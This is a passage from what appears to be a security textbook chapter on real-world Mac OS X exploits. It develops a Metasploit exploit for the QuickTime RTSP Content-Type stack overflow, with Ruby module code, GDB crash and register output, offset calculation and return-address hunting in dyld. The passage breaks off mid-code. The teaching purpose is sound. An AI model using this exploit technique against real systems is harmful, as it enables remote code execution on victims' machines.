9955336633cc0099..iinndddd 225599 11//2255//0099 44::4422::2299 PPMM
260 Part III ■ Exploitation
“PowerPC / OS X (Darwin) Shellcode Assembly,” B-r00t, http://
packetstormsecurity.org/shellcode/PPC_OSX_Shellcode_Assembly.pdf
“Remote Library Injection,” skape and Jarkko Turkulainen, http://www
.nologin.org/Downloads/Papers/remote-library-injection.pdf
“Programming Environments Manual for 32-Bit Implementations of the
PowerPC Architecture,” http://www.freescale.com/files/product/
doc/MPCFPE32B.pdf
Anley, Heasman, Linder, and Richarte. The Shellcoder’s Handbook:
Discovering and Exploiting Security Holes (2nd Edition), Wiley 2007.
http://www.metasploit.com/framework
Hyde, Randall. The Art of Assembly Language, No Starch Press, September
2003.
9955336633cc0099..iinndddd 226600 11//2255//0099 44::4422::2299 PPMM
CHAPTER
10
Real-World Exploits
The last three chapters discussed exploitation and exploit payload techniques in
isolation, presenting the background and theory of vulnerability exploitation.
In this chapter, we are going to put the theory into practice and demonstrate
the techniques in real-world exploits for Mac OS X Tiger and Leopard for both
PowerPC and x86.
In the examples in this chapter, we will also demonstrate the process of devel-
oping an exploit for a given vulnerability from the point where the vulnerability
may be reliably triggered to the point that we have reliable code execution. If an
attack string can be considered an equation, where the variables are the elements
in the attack string that affect execution, then this process essentially involves
identifying and solving for these variables. In practice we will use tools such as
pattern strings to identify the offsets of signifi cant elements in the attack string,
and we’ll examine the process address space to fi nd suitable memory addresses
or values for these elements.
Most exploits are no longer run as stand-alone programs, but are used within
a larger framework such as the CORE IMPACT and CANVAS penetration-test-
ing tools or the open-source Metasploit Framework. In this chapter we will use
Metasploit since it is freely available and well documented. All the exploits in
this chapter are available as fully functional exploits for Metasploit in this book’s
accompanying source-code package. They may be used with Metasploit’s own
payloads or the payloads described in the previous chapter, which are also
included as Metasploit modules.
261
9955336633cc1100..iinndddd 226611 11//2255//0099 44::4422::4477 PPMM
262 Part III ■ Exploitation
QuickTime RTSP Content-Type Header Overfl ow
Apple QuickTime versions 4.0 through 7.3 were vulnerable to a stack buffer over-
fl ow when processing a long Content-Type header sent in a Real Time Streaming
Protocol (RTSP) response from a server. A malicious user could embed an RTSP
link in a web page to cause a user to connect to their malicious RTSP server. This
vulnerability affected all Mac and Windows platforms supported by vulnerable
versions of QuickTime.
This exploit makes a nice fi rst example since it is quite simple to reproduce
and affects QuickTime on both Tiger and Leopard. This allows us to use it to
demonstrate a variety of exploitation techniques on PowerPC and x86.
Triggering the Vulnerability
We are going to walk you through the process of triggering and developing an
exploit for this vulnerability using Metasploit. In the code examples that fol-
low, we will show you important Metasploit module methods in isolation, but
not the entire modules. For the entire modules, see the book’s accompanying
source-code package.
First we will verify that we can trigger the vulnerability in the simplest way
possible: by sending a long string of “A” characters. In this particular vulner-
ability we must send a nonempty RTSP response body, but it does not matter
what is in it. We also must be sure that we leave the connection open and do
not close it in our exploit’s on_client_connect method.
def on_client_connect(client)
boom = “A” * 1024
body = “ “
header =
“RTSP/1.0 200 OK\r\n”+
“CSeq: 1\r\n”+
“Content-Type: #{boom}\r\n”+
“Content-Length: #{body.length}\r\n\r\n”
client.put(header + body)
end
Now if we connect to the RTSP server through QuickTime Player or by click-
ing on an RTSP link in Safari, we will get a nice juicy crash and we can begin
working on the exploit.
9955336633cc1100..iinndddd 226622 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 263
Exploitation on PowerPC
We will begin by exploiting this vulnerability on the oldest and simplest plat-
form to exploit, QuickTime 7.0.0 on Mac OS X 10.4.0 for PowerPC. Although
the memory addresses are specifi c to this operating system version, the offsets
remain the same and alternate memory addresses could be substituted to exploit
versions of QuickTime up to 7.3 on Leopard.
In developing the exploit, we will use Metasploit’s pattern strings to quickly
and easily identify offsets within our attack string. As a fi rst step, we will replace
our long string of “A” characters with a pattern string of the same length and
attempt the exploit again. Our exploit method now looks like this:
def on_client_connect(client)
boom = Rex::Text.pattern_create(1024)
body = “ “
header =
“RTSP/1.0 200 OK\r\n”+
“CSeq: 1\r\n”+
“Content-Type: #{boom}\r\n”+
“Content-Length: #{body.length}\r\n\r\n”
client.put(header + body)
end
Now we will launch Metasploit and our exploit within it on our attacking
host. Notice that we don’t set any variables, like PAYLOAD, LHOST, or RHOST,
because we aren’t actually using any payloads yet.
% ./msfconsole
_ _ _ _
| | | | (_) |
_ __ ___ ___| |_ __ _ ___ _ __ | | ___ _| |_
| ‘_ ` _ \ / _ \ __/ _` / __| ‘_ \| |/ _ \| | __|
| | | | | | __/ || (_| \__ \ |_) | | (_) | | |_
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|
| |
|_|
=[ msf v3.2-release
+ -- --=[ 308 exploits - 172 payloads
+ -- --=[ 20 encoders - 6 nops
=[ 67 aux
9955336633cc1100..iinndddd 226633 11//2255//0099 44::4422::4477 PPMM
264 Part III ■ Exploitation
msf > use exploit/osx/quicktime/rtsp_content_type
msf exploit(rtsp_content_type) > exploit
[*] Started bind handler
[*] Server started.
msf exploit(rtsp_content_type) >
On the target host, we will launch QuickTime Player from GDB so that we
may easily detect and examine the crashes.
% gdb /Applications/QuickTime\ Player.app/Contents/MacOS/QuickTime\
Player
GNU gdb 6.1-20040303 (Apple version gdb-384) (Mon Mar 21 00:05:26 GMT
2005)
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are
welcome to change it and/or distribute copies of it under certain
conditions.
Type “show copying” to see the conditions.
There is absolutely no warranty for GDB. Type “show warranty” for
details.
This GDB was configured as “powerpc-apple-darwin”…Reading symbols for
shared libraries ........... done
warning: unable to read history from “/Users/ddz/.gdb_history”:
Permission denied
(gdb) run
Starting program: /Applications/QuickTime Player.app/Contents/MacOS/
QuickTime Player
Reading symbols for shared libraries ...................................
..................................... done
Reading symbols for shared libraries .. done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
9955336633cc1100..iinndddd 226644 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 265
At this point we will manually connect to the malicious RTSP URL in
QuickTime Player and get it to crash.
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x33417334
0x33417334 in ?? ()
Excellent. We have crashed by returning to an address that we can control in
our exploit. We can identify this by seeing that the register’s value is all ASCII
byte values, corresponding to a substring within our pattern string. Metasploit
includes a command-line tool (pattern_offset.rb) to identify the offset of a four-
byte value within a pattern string of a given length. We can use this to identify
the offset of the return address by passing the hexadecimal values of the bytes
from the string. This tool assumes that the hex values are little-endian, so we
must reverse the byte order ourselves.
% ./tools/pattern_offset.rb 0x34734133 1024
551
Let’s look around some more.
(gdb) info registers
r0 0x68750000 1752498176
r1 0xbfffc240 3221209664
r2 0x72 114
r3 0x6875683f 1752524863
r4 0xbfffc120 3221209376
r5 0x0 0
r6 0x0 0
r7 0x0 0
r8 0x33417334 859927348
r9 0xbfffc020 3221209120
r10 0x60 96
r11 0xaa0dbb04 2853026564
r12 0x90b23f44 2427600708
r13 0x0 0
r14 0x0 0
r15 0x0 0
r16 0x20000000 536870912
r17 0x0 0
r18 0x0 0
r19 0x0 0
r20 0xbfffd7b0 3221215152
r21 0x0 0
r22 0x1 1
r23 0xff0 4080
r24 0x0 0
r25 0x72730000 1920139264
9955336633cc1100..iinndddd 226655 11//2255//0099 44::4422::4477 PPMM
266 Part III ■ Exploitation
r26 0x3f6ff0 4157424
r27 0xbfffc390 3221210000
r28 0xbfffc390 3221210000
r29 0x41723741 1098004289
r30 0x72384172 1916289394
r31 0x39417330 960590640
pc 0x33417334 859927348
ps 0x4200f030 1107357744
cr 0x24242444 606348356
lr 0x33417334 859927348
ctr 0x90b23f44 2427600708
xer 0x4 4
mq 0x0 0
fpscr 0xa6024100 2785165568
vscr 0x10001 65537
vrsave 0x0 0
(gdb)
In the preceding register dump, observe that registers r3, r8, r29, r30, r31, and
lr are under the attacker’s control. Also note that several registers hold stack-
memory addresses, and since this is a stack buffer overfl ow, some of these may
point to our attack string. That just happens to be the case.
(gdb) x/x 0xbfffc390
0xbfffc390: 0x42643342
(gdb) x/s 0xbfffc390
0xbfffc390: “Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9
Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2
Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B??p”
As before, we will use pattern_offset.rb to identify the offset within our attack
string to which this memory address points. This time we will pass four char-
acters from the string rather than a reversed hexadecimal address.
% ./tools/pattern_offset.rb Bd3Bd 1024
879
We now know the offset of the return address in our attack string, two reg-
isters that point to our attack string, and the offset within our attack string to
which the registers point. This is enough for us to build an exploit if we can fi nd
a return address that will transfer control indirectly through that register.
The easiest way for us to fi nd a suitable return address is to grep through a
disassembly. We will disassemble /usr/lib/dyld since it is mapped into every
process at a known location and changes less often than other libraries do.
On PowerPC, register-indirect function calls are made by loading a memory
address into the ctr register and executing a bctrl instruction. We will search
9955336633cc1100..iinndddd 226666 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 267
through the disassembly for any instructions that load r27 or r28 into the ctr
register and call it.
otool -tv /usr/lib/dyld | grep -A 1 -E ‘mtspr.*ctr,(r27|r28)’ | grep -B
1 bctrl
8fe23b30 mtspr ctr,r28
8fe23b34 bctrl
--
8fe2d304 mtspr ctr,r27
8fe2d308 bctrl
--
8fe2d3f4 mtspr ctr,r27
8fe2d3f8 bctrl
--
8fe2d604 mtspr ctr,r27
8fe2d608 bctrl
--
8fe3f88c mtspr ctr,r27
8fe3f890 bctrl
That gives us several useful return addresses to choose from. Now we can put
this address into our exploit. Instead of a payload, we will simply use a single
breakpoint instruction. This is useful to see whether we are executing memory
where we want to without having to worry about any complications arising from
an exploit payload or encoder. Our exploit method now looks like this:
def on_client_connect(client)
boom = Rex::Text.pattern_create(1024)
boom[551, 4] = [0x8fe23b30].pack(‘N’)
boom[879, 4] = [0x7c842008].pack(‘N’)
body = “ “
header =
“RTSP/1.0 200 OK\r\n”+
“CSeq: 1\r\n”+
“Content-Type: #{boom}\r\n”+
“Content-Length: #{body.length}\r\n\r\n”
client.put(header + body)
end
When we reload our exploit in Metasploit on the attacker host and in
QuickTime Player on the target host, we see that we successfully execute our
breakpoint instruction.
Program received signal EXC_SOFTWARE, Software generated exception.
0xbfffc390 in ?? ()
(gdb)
9955336633cc1100..iinndddd 226677 11//2255//0099 44::4422::4477 PPMM
268 Part III ■ Exploitation
Finally, we clean up our exploit method by making our magic addresses
exploit target parameters and use a real Metasploit payload instead of a single
breakpoint instruction. Our fi nal exploit method looks like the following.
def on_client_connect(client)
boom = Rex::Text.pattern_create(1024)
boom[551, 4] = [target[‘bl_r27’]].pack(‘N’)
boom[879, payload.encoded.length] = payload.encoded
body = “ “
header =
“RTSP/1.0 200 OK\r\n”+
“CSeq: 1\r\n”+